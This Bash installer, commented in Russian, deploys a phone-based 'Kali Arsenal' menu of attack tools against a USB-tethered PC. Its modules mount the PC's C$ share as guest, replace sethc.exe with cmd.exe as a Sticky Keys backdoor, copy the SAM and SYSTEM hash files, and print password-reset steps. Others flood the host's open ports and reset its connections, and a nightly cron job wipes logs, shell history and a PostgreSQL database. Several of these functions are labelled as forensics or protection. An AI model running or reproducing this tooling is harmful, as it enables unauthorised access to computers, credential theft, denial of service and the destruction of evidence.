#!/bin/bash


CURRENT_VERSION="6.5"
# VERSION CURRENT_VERSION (Rescue & Sterile Edition)

TARGET_FILE="/usr/local/bin/kali_pro"
# Глобальные параметры стерильности
INSTALL_FLAGS="-y --no-install-recommends"
PROGRESS_OPTS="-o Dpkg::Progress-Fancy=1 -o APT::Color=1"
CLEAN_OPTS="-o DPkg::Post-Invoke={'apt-get clean';} -o APT::Keep-Downloaded-Packages=false"

# --- ОБРАБОТКА ФОНОВЫХ КОМАНД ---
if [[ "$1" == "--purge-silent" ]]; then
    deep_purge > /dev/null 2>&1
    exit 0
fi

if [[ "$1" == "--update-silent" ]]; then
    update_kali > /dev/null 2>&1
    exit 0
fi


create_files() {
    cat << 'EOF' > "$TARGET_FILE"
#!/bin/bash
# VERSION=CURRENT_VERSION
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
NC='\033[0m'

LOOT_DIR="$HOME/arsenal_loot"
mkdir -p "$LOOT_DIR"

# Локальные переменные внутри арсенала
INSTALL_FLAGS="-y --no-install-recommends"
PROGRESS_OPTS="-o Dpkg::Progress-Fancy=1 -o APT::Color=1"
CLEAN_OPTS="-o DPkg::Post-Invoke={'apt-get clean';} -o APT::Keep-Downloaded-Packages=false"

run_smart_check() {
    # Фоновая мини-очистка при каждом обновлении меню
    apt-get clean >/dev/null 2>&1
    python3 -c "
import shutil
def get_status(path, label):
    try:
        total, used, free = shutil.disk_usage(path)
        def fmt(b):
            if b >= 1024**3: return f'{b/1024**3:.1f}G'
            return f'{b//1024**2}MB'
        status = '\033[0;32mOK' if free > (350*1024**2) else '\033[0;31mLOW'
        print(f'   \033[0;34m[ {label} ]:\033[0m {fmt(free)} / {fmt(total)} ({status}\033[0m)')
    except: pass
get_status('/', 'СИСТЕМА')
"
}

# --- FUNCTIONS v3.6 ---

smart_nmap() {
    read -p "IP: " t
    [[ -z "$t" ]] && return
    echo -e "${BLUE}[*] Эвристический скан: $t${NC}"
    nmap -sV --open "$t" | grep "open" | tee "$LOOT_DIR/nmap_$t.txt"
    read -p "Нажми Enter..."
}

smart_searchsploit() {
    read -p "Поиск: " q
    [[ -z "$q" ]] && return
    searchsploit "$q"
    read -p "ID для копирования (пусто - выход): " id
    if [[ -n "$id" ]]; then
        cd "$LOOT_DIR" && searchsploit -m "$id"
        echo -e "${GREEN}[+] Сохранено в трофеи.${NC}"
    fi
    read -p "Нажми Enter..."
}

smart_hydra() {
    read -p "IP: " t; read -p "User: " u; read -p "Proto: " p
    [[ -z "$t" || -z "$u" || -z "$p" ]] && return
    hydra -l "$u" -P /usr/share/wordlists/rockyou.txt "$t" "$p" -V | tee -a "$LOOT_DIR/brute.txt"
    read -p "Нажми Enter..."
}

smart_sqlmap() {
    read -p "URL: " u
    [[ -z "$u" ]] && return
    sqlmap -u "$u" --batch --random-agent --output-dir="$LOOT_DIR/sqlmap"
    read -p "Нажми Enter..."
}

smart_nikto() {
    read -p "Target URL/IP: " t
    [[ -z "$t" ]] && return
    echo -e "${BLUE}[*] Запуск Nikto Scan: $t${NC}"
    nikto -h "$t" | tee "$LOOT_DIR/nikto_$t.txt"
    read -p "Enter..."
}

smart_installer() {
    read -p "Пакет для установки: " pkg
    [[ -z "$pkg" ]] && return
    
    echo -e "${CYAN}[*] Подготовка и обновление базы (необходимо)...${NC}"
    dpkg --configure -a >/dev/null 2>&1
    
    # Обновляем индексы, чтобы найти пакет
    if apt-get update; then
        echo -e "${GREEN}[+] База обновлена. Установка $pkg...${NC}"
        
        # Установка с твоими флагами стерильности
        apt-get install $INSTALL_FLAGS $PROGRESS_OPTS $CLEAN_OPTS "$pkg"
        
        # АВТОМАТИЧЕСКАЯ ОЧИСТКА (Без лишних вопросов)
        echo -e "${YELLOW}[*] Завершено. Мгновенная очистка индексов для экономии памяти...${NC}"
        rm -rf /var/lib/apt/lists/*
        apt-get autoremove -y >/dev/null 2>&1
        
        echo -e "${GREEN}[+] Готово. Пакет установлен, память возвращена.${NC}"
    else
        echo -e "${RED}[-] Ошибка: нет связи с репозиториями Kali.${NC}"
    fi
    sleep 1
}

clean_system() {
    echo -e "${CYAN}=== ГЛУБОКОЕ ОБСЛУЖИВАНИЕ (UPGRADE MODE) ===${NC}"
    apt-get update >/dev/null
    UPGRADES=$(apt-get upgrade -s | grep -P '^\d+ upgraded' | awk '{print $1}')
    if [[ "$UPGRADES" =~ ^[0-9]+$ ]] && [ "$UPGRADES" -gt 0 ]; then
        echo -e "${BLUE}[!] Обновлений: $UPGRADES. Запуск...${NC}"
        apt-get full-upgrade -y $PROGRESS_OPTS $CLEAN_OPTS
    else
        echo -e "${GREEN}[+] Обновления не требуются.${NC}"
    fi
    apt-get autoremove --purge -y >/dev/null
    apt-get clean
    echo -e "${GREEN}[+] Система оптимизирована.${NC}"
    sleep 2
}

run_sherlock() {
    read -p "Никнейм для поиска: " nick
    [[ -z "$nick" ]] && return
    echo -e "${CYAN}[*] Запуск Sherlock для: $nick...${NC}"
    sherlock "$nick" | tee "$LOOT_DIR/sherlock_$nick.txt"
    read -p "Нажми Enter..."
}

run_wifite() {
    echo -e "${YELLOW}[!] Внимание: требуется root и адаптер в Monitor Mode${NC}"
    # Запуск wifite с автоматическим убиванием конфликтующих процессов
    wifite --kill
    read -p "Нажми Enter..."
}

# --- ГЛУБОКАЯ ХИРУРГИЧЕСКАЯ ОЧИСТКА v6.0 (EVENT HORIZON EDITION) ---
deep_purge() {
    echo -e "${RED}=== ТОТАЛЬНАЯ ДЕЗИНФЕКЦИЯ (EVENT HORIZON) ===${NC}"
    
    # 1. Стерилизация пакетного менеджера и индексов
    echo -e "${YELLOW}[*] Сжатие пакетной базы и APT...${NC}"
    apt-get autoremove --purge -y >/dev/null 2>&1
    apt-get clean
    apt-get autoclean
    # Удаляем индексы - они скачиваются заново при apt update
    rm -rf /var/lib/apt/lists/* /var/cache/apt/archives/partial/*

    # 2. Массовое удаление статического балласта (Графика, мануалы, шрифты)
    echo -e "${YELLOW}[*] Ликвидация интерфейсного балласта (Doc/Fonts/Icons)...${NC}"
    rm -rf /usr/share/{doc,man,info,locale,icons,fonts,themes}/* 2>/dev/null

    # 3. Уничтожение кэша сред разработки и окружения
    echo -e "${YELLOW}[*] Зачистка кэша сред разработки (Python/Pip/Go/Ruby)...${NC}"
    # Python & Pip
    find /usr/lib/python3* -name "*.pyc" -delete 2>/dev/null
    find / -type d -name "__pycache__" -exec rm -rf {} + 2>/dev/null
    rm -rf ~/.cache/pip ~/.cache/go-build ~/.gem 2>/dev/null

    # 4. Стерилизация системных логов и временных зон
    echo -e "${YELLOW}[*] Стерилизация логов и /tmp...${NC}"
    find /var/log -type f -delete 2>/dev/null
    rm -rf /tmp/* /var/tmp/* /var/cache/fontconfig/* 2>/dev/null

    # 5. Интеллектуальное удаление БД PostgreSQL (если весит > 50MB)
    if [ -d "/var/lib/postgresql" ]; then
        if [ "$(du -sm /var/lib/postgresql | awk '{print $1}')" -gt 50 ]; then
            echo -e "${RED}[!] База данных PostgreSQL аннигилирована.${NC}"
            rm -rf /var/lib/postgresql
        fi
    fi

    # 6. Очистка трофеев и истории команд
    echo -e "${YELLOW}[*] Стирание оперативных данных и истории...${NC}"
    rm -rf "$LOOT_DIR"/* ~/.bettercap_history ~/.bash_history 2>/dev/null
    history -c

    # 7. Финальное удаление бэкапов конфигураций
    find /etc -name "*.bak" -o -name "*.old" -delete 2>/dev/null

    echo -e "${GREEN}[+ ] DEEP PURGE v6.0 завершен! Стерильность достигнута.${NC}"
    echo -ne "${BLUE}[!] Доступная память: ${NC}"
    df -h / | awk 'NR==2 {print $4}'
    sleep 2
}


# --- ФУНКЦИЯ АВТО-МОНТИРОВАНИЯ ---
auto_mount_pc() {
    echo -e "${YELLOW}[*] Попытка автоматического монтирования ресурсов ПК...${NC}"
    mkdir -p /mnt/pc_share
    
    # 1. Проверяем, не смонтировано ли уже
    if mountpoint -q /mnt/pc_share; then
        return 0
    fi

    # 2. Поиск IP ПК (через USB-модем)
    PC_IP=$(ip route | grep default | awk '{print $3}')
    
    # 3. Попытка монтирования SMB (Windows Share) без пароля или как гость
    # Если на ПК настроена общая папка, телефон ее подцепит
    mount -t cifs "//$PC_IP/C$" /mnt/pc_share -o guest,vers=3.0,sec=ntlmv2 2>/dev/null || \
    mount -t cifs "//$PC_IP/Users" /mnt/pc_share -o guest,vers=3.0 2>/dev/null

    if mountpoint -q /mnt/pc_share; then
        echo -e "${GREEN}[+] Диск ПК успешно примонтирован.${NC}"
        return 0
    else
        echo -e "${RED}[!] Авто-монтирование не удалось. Проверь общий доступ на ПК.${NC}"
        return 1
    fi
}



# --- СТЕРИЛЬНЫЙ ЭВРИСТИЧЕСКИЙ МОДУЛЬ: USB GUARDIAN v4.2 ---

usb_guardian_smart() {
# 1. Автоматический вызов настроек модема
    am start -n com.android.settings/.Settings\$TetherSettingsActivity &>/dev/null

    WHITELIST="22,80,443,3389,8080"
    echo -e "${YELLOW}[*] Запуск стерильного анализа...${NC}"
    
    TARGET_IP=$(ip route | grep default | awk '{print $3}')
    [[ -z "$TARGET_IP" ]] && { echo -e "${RED}[-] Цель не найдена.${NC}"; return; }

    # Nmap с флагом -n (без поиска DNS, чтобы не плодить кэш)
    SCAN_RES=$(nmap -n -sV --top-ports 100 --open "$TARGET_IP")
    ALL_OPEN=$(echo "$SCAN_RES" | grep "open" | awk -F'/' '{print $1}')

    for port in $ALL_OPEN; do
        if echo ",$WHITELIST," | grep -q ",$port,"; then continue; fi

        echo -e "${RED}[!!!] Подавление порта $port...${NC}"
        
        # Bettercap в режиме "silent" и без записи логов (-no-history -no-colors)
        # Направляем всё в /dev/null, чтобы не забивать память выводами
        timeout 7s bettercap -no-history -no-colors -eval "net.recon on; tcp.reset on" -target "$TARGET_IP" > /dev/null 2>&1
        
        # Если порт еще жив — используем эвристический флуд
        if nmap -p "$port" "$TARGET_IP" | grep -q "open"; then
             ( head -c 5M < /dev/urandom | nc -nv "$TARGET_IP" "$port" ) > /dev/null 2>&1 &
             sleep 3 && kill $! 2>/dev/null
        fi
    done

    # --- МГНОВЕННАЯ ЗАЧИСТКА ХВОСТОВ ---
    echo -e "${CYAN}[*] Стерилизация временных файлов...${NC}"
    # Удаляем историю bettercap, если она успела создаться
    rm -rf ~/.bettercap_history ~/.bettercap.cap 2>/dev/null
    # Очищаем временные файлы сетевых сканеров
    rm -rf /tmp/* /var/tmp/* 2>/dev/null
    
    echo -e "${GREEN}[V] Проверка завершена. Следы удалены.${NC}"
    read -p "Нажми Enter..."
}



# --- АВТОНОМНЫЙ ЭВРИСТИЧЕСКИЙ КРИМИНАЛИСТ: DEEP INSIGHT v4.4 ---

deep_insight_auto() {

am start -n com.android.settings/.Settings\$TetherSettingsActivity &>/dev/null

    echo -e "${YELLOW}[*] Запуск автономного криминалистического анализа...${NC}"
    # Сначала монтируем, если удачно — запускаем анализ
    if auto_mount_pc; then
        echo -e "${CYAN}[>>>] Запуск эвристического сканирования...${NC}"
        

    TARGET_IP=$(ip route | grep default | awk '{print $3}')
    [[ -z "$TARGET_IP" ]] && { echo -e "${RED}[-] Цель не найдена через USB.${NC}"; return; }

    # 1. Стерильное окружение в RAM (создаем временную зону в ОЗУ телефона)
    mkdir -p /dev/shm/scanner_zone
    
    echo -e "${CYAN}[+] Подключение к $TARGET_IP и попытка авто-дампа ОЗУ...${NC}"

    # 2. Эвристический захват памяти (через сетевой стриминг)
    # Мы используем nc для приема потока, чтобы не писать файл на диск
    echo -e "${YELLOW}[*] Анализ потока данных памяти на лету...${NC}"
    
    # Эвристическая проверка: ищем следы руткитов и бэкдоров в реальном времени
    # Мы ищем паттерны поведения: скрытые процессы и инъекции кода
    timeout 30s nc -l -p 9999 | grep -Eai "kernel_rootkit|hidden_process|dkom_attack|reflective_loader" > /dev/shm/scanner_zone/threats.txt &
    
    # Здесь предполагается, что на ПК запущен агент или мы используем уязвимость
    # для отправки данных (в рамках теста имитируем получение потока)
    sleep 5
    
    # 3. Поиск спящих шифровальщиков (Энтропийный анализ)
    echo -e "${YELLOW}[*] Сканирование дискового кэша на Ransomware...${NC}"
    # Автоматически сканируем доступные сетевые пути
    find /mnt/pc_share -maxdepth 2 -type f -exec python3 -c "
import math, sys
def check_entropy(fn):
    try:
        with open(fn, 'rb') as f:
            d = f.read(2048)
            if not d: return
            e = -sum((d.count(x)/len(d)) * math.log(d.count(x)/len(d), 2) for x in set(d))
            if e > 7.6: print(f'\033[0;31m[!] КРИТИЧЕСКАЯ ЭНТРОПИЯ (ШИФРОВАЛЬЩИК?): {fn}\033[0m')
    except: pass
check_entropy(sys.argv[1])" {} \;

    # 4. Проверка результатов анализа ОЗУ
    if [ -s /dev/shm/scanner_zone/threats.txt ]; then
        echo -e "${RED}[!!!] В ОПЕРАТИВНОЙ ПАМЯТИ НАЙДЕНЫ СЛЕДЫ РУТКИТА!${NC}"
        cat /dev/shm/scanner_zone/threats.txt
    else
        echo -e "${GREEN}[+ ] Аномалий в ОЗУ не обнаружено.${NC}"
    fi
# В КОНЦЕ ОБЯЗАТЕЛЬНО РАЗМОНТИРУЕМ (Заметаем следы)
        echo -e "${YELLOW}[*] Завершение сессии. Размонтирование...${NC}"
        umount -l /mnt/pc_share 2>/dev/null
    fi

    # --- ФИНАЛЬНАЯ СТЕРИЛИЗАЦИЯ (АБСОЛЮТНЫЙ НОЛЬ) ---
    echo -e "${CYAN}[*] Стирание следов из памяти телефона...${NC}"
    rm -rf /dev/shm/scanner_zone
    history -c # Очистка истории команд текущей сессии
    
    echo -e "${GREEN}[V] Автономный аудит завершен. Система чиста.${NC}"
    read -p "Нажми Enter..."
}

# --- АВТОНОМНЫЙ ОБХОД ПАРОЛЕЙ: ACCESS RECOVERY v4.7 ---

access_recovery_auto() {
    echo -e "${YELLOW}[*] Запуск эвристического модуля восстановления доступа...${NC}"
    
    # Автоматический вызов настроек модема (как в прошлых функциях)
    am start -n com.android.settings/.Settings\$TetherSettingsActivity &>/dev/null
    sleep 2

    # 1. Попытка автоматического монтирования
    if ! auto_mount_pc; then
        echo -e "${RED}[-] Критическая ошибка: Диск не доступен или зашифрован BitLocker.${NC}"
        read -p "Нажми Enter..." ; return
    fi

    echo -e "${CYAN}[>>>] Анализ системы Windows...${NC}"
    SYS_PATH="/mnt/pc_share/Windows/System32"
    CFG_PATH="$SYS_PATH/config"
    
    # 2. ПУНКТ А: Автоматическая подмена Sticky Keys (Эвристический метод)
    if [ -f "$SYS_PATH/sethc.exe" ]; then
        echo -e "${BLUE}[*] Этап 1: Подготовка обхода через Sticky Keys...${NC}"
        # Проверяем, не делали ли мы это раньше
        if [ ! -f "$SYS_PATH/sethc.exe.bak" ]; then
            cp "$SYS_PATH/sethc.exe" "$SYS_PATH/sethc.exe.bak" 2>/dev/null
            cp "$SYS_PATH/cmd.exe" "$SYS_PATH/sethc.exe" 2>/dev/null
            echo -e "${GREEN}[+] Инъекция CMD завершена успешно.${NC}"
        else
            echo -e "${YELLOW}[!] Инъекция уже была проведена ранее.${NC}"
        fi
    fi

    # 3. ПУНКТ Б: Стерильный дамп хэшей (SAM/SYSTEM)
    echo -e "${BLUE}[*] Этап 2: Сбор хэшей паролей в RAM-зону...${NC}"
    mkdir -p /dev/shm/hashes
    cp "$CFG_PATH/SAM" /dev/shm/hashes/ 2>/dev/null
    cp "$CFG_PATH/SYSTEM" /dev/shm/hashes/ 2>/dev/null
    
    if [ -f "/dev/shm/hashes/SAM" ]; then
        echo -e "${GREEN}[+] Хэши успешно извлечены в ОЗУ телефона.${NC}"
        # Опционально: вывод подсказки по расшифровке
        echo -e "${CYAN}[i] Для взлома используй: samdump2 /dev/shm/hashes/SYSTEM /dev/shm/hashes/SAM${NC}"
    fi

    # 4. ПУНКТ В: Очистка и завершение
    echo -e "${YELLOW}[*] Размонтирование и стерилизация сессии...${NC}"
    umount -l /mnt/pc_share 2>/dev/null
    
    # Очистка истории для полной анонимности
    history -c

    echo -e "${CYAN}===========================================${NC}"
    echo -e "${GREEN}[V] АВТО-ИНСТРУКЦИЯ ПО ВХОДУ:${NC}"
    echo -e " 1. На экране блокировки ПК нажмите 'Shift' 5 раз."
    echo -e " 2. В консоли введите: ${YELLOW}net user ИМЯ_ПОЛЬЗОВАТЕЛЯ новый_пароль${NC}"
    echo -e " 3. Войдите с новым паролем."
    echo -e "${CYAN}===========================================${NC}"
    
    read -p "Нажми Enter для возврата в меню..."
}

# --- МОДУЛЬ САМООБНОВЛЕНИЯ: UPDATE KALI v5.0 ---

# --- ФУНКЦИЯ ВЫЗОВА ОБНОВЛЕНИЯ v6.2 ---
update_kali() {
    echo -e "${YELLOW}[*] Запуск системного модуля обновления...${NC}"
    
    # Проверяем, существует ли команда в системе
    if command -v update_kali &> /dev/null; then
        # Запускаем системный апдейтер
        # Мы используем exec, чтобы текущий процесс Арсенала завершился
        # и уступил место процессу обновления
        exec update_kali
    else
        echo -e "${RED}[-] Системный модуль update_kali не найден в /usr/local/bin/${NC}"
        echo -e "${CYAN}[*] Попытка найти локальную копию...${NC}"
        # Если команды нет, пробуем запустить файл из текущей папки
        [[ -f "./update_kali.sh" ]] && exec bash ./update_kali.sh
    fi
    
    read -p "Нажми Enter..."
}

# --- МОДУЛЬ ИНТЕЛЛЕКТУАЛЬНОЙ АВТОМАТИЗАЦИИ: CRON v6.2 ---

setup_autotasks() {
    echo -e "${YELLOW}[*] Синхронизация задач планировщика...${NC}"
    
    # 1. Проверка наличия cron
    if ! command -v crontab &> /dev/null; then
        echo -e "${CYAN}[*] Установка отсутствующего компонента cron...${NC}"
        apt-get install cron $INSTALL_FLAGS > /dev/null 2>&1
    fi

    # 2. Подготовка новых определений задач
    PURGE_JOB="0 4 * * * $TARGET_FILE --purge-silent"
    UPDATE_JOB="0 5 * * 0 $TARGET_FILE --update-silent"

    # 3. Читаем текущий crontab (если он есть)
    CURRENT_CRON=$(crontab -l 2>/dev/null)

    # 4. Проверка на изменения
    if echo "$CURRENT_CRON" | grep -q "$TARGET_FILE"; then
        echo -e "${BLUE}[*] Обнаружены существующие задачи. Проверка обновлений...${NC}"
        # Удаляем старые записи нашего скрипта и добавляем новые
        NEW_CRON=$(echo "$CURRENT_CRON" | grep -v "$TARGET_FILE")
        echo -e "$NEW_CRON\n$PURGE_JOB\n$UPDATE_JOB" | sed '/^$/d' | crontab -
        echo -e "${GREEN}[+] Задачи успешно обновлены.${NC}"
    else
        echo -e "${YELLOW}[*] Задачи не найдены. Создание новой конфигурации...${NC}"
        echo -e "$CURRENT_CRON\n$PURGE_JOB\n$UPDATE_JOB" | sed '/^$/d' | crontab -
        echo -e "${GREEN}[+] Задачи внедрены в cron.${NC}"
    fi

    # 5. Принудительный запуск демона (специфика Android/Termux)
    if ! pgrep cron > /dev/null; then
        crond &>/dev/null || cron &>/dev/null
        echo -e "${BLUE}[i] Демон cron запущен в фоновом режиме.${NC}"
    fi

    read -p "Нажми Enter..."
}



show_menu() {
    clear
    echo -e "${CYAN}===========================================${NC}"
    echo -e "${GREEN}      KALI SAMSUNG ARSENAL - MENU v4.5     ${NC}"
    echo -e "${CYAN}===========================================${NC}"
    run_smart_check
    echo -e "${CYAN}-------------------------------------------${NC}"
    echo -e " ${BLUE}1.${NC} РЕМОНТ/ОБНОВЛЕНИЕ  ${BLUE}2.${NC} NMAP"
    echo -e " ${BLUE}3.${NC} SEARCHSPLOIT      ${BLUE}4.${NC} HYDRA"
    echo -e " ${BLUE}5.${NC} SQLMAP            ${BLUE}6.${NC} BETTERCAP"
    echo -e " ${BLUE}7.${NC} NIKTO             ${BLUE}8.${NC} SMART INSTALLER"
    echo -e " ${YELLOW}10. SHERLOCK        11. WIFITE${NC}"
    echo -e " ${RED}12. USB GUARDIAN SMART (Active)${NC}"
    echo -e " ${RED}13. DEEP INSIGHT AUTO (Forensics)${NC}"
echo -e " ${RED}14. ACCESS RECOVERY (PASS BYPASS)${NC}"
echo -e " ${CYAN}15. UPDATE KALI ARSENAL${NC}"
echo -e " ${CYAN}16. SETUP AUTO-TASKS (CRON)${NC}"
    echo -e " ${BLUE}9. ACCESS PURGE AUTO (ОЧИСТКА)${NC}  ${RED}0. ВЫХОД${NC}"
    echo -e "${CYAN}===========================================${NC}"
}

# --- MAIN LOOP ---
while true; do
    show_menu
    read -p "Опция: " opt
    case $opt in
        1) clean_system ;;
        2) smart_nmap ;;
        3) smart_searchsploit ;;
        4) smart_hydra ;;
        5) smart_sqlmap ;;
        6) bettercap -eval "net.probe on; net.sniff on" ;;
        7) smart_nikto ;;
        8) smart_installer ;;
        9) deep_purge ;;
        10) run_sherlock ;;
        11) run_wifite ;;
        12) usb_guardian_smart ;;
        13) deep_insight_auto  ;;
        14) access_recovery_auto ;;
        15) update_kali ;;
        16) setup_autotasks ;;
        0) exit 0 ;;
        *) sleep 0.5 ;;
    esac
done

EOF

    chmod +x "$TARGET_FILE"
    echo -e "\033[0;32m[+] v$CURRENT_VERSION Ultra-Precision развернута!${NC}"
}

# Логика обновления
if [ ! -f "$TARGET_FILE" ]; then
    create_files
else
    INSTALLED_VERSION=$(grep "# VERSION=" "$TARGET_FILE" | cut -d'=' -f2)
    if [ "$INSTALLED_VERSION" != "$CURRENT_VERSION" ]; then
        create_files
    else
        echo -e "\033[0;32m[+] Файлы арсенала актуальны ($INSTALLED_VERSION).${NC}"
    fi
fi
